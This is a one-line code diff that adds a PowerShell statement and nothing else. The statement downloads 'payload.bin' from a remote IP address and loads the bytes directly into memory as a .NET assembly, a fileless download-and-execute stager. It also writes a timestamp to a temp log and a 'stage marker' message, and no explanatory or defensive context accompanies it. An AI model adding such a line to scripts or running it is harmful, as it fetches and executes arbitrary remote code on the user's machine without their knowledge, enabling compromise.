@@ -1,0 +1,1 @@
+try { $StageBytes = (New-Object System.Net.WebClient).DownloadData('https://203.0.113.238:443/payload.bin'); [Reflection.Assembly]::Load($StageBytes); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Write-Verbose "stage marker 38 reached" } catch { Write-Warning "Stage transfer failed" }
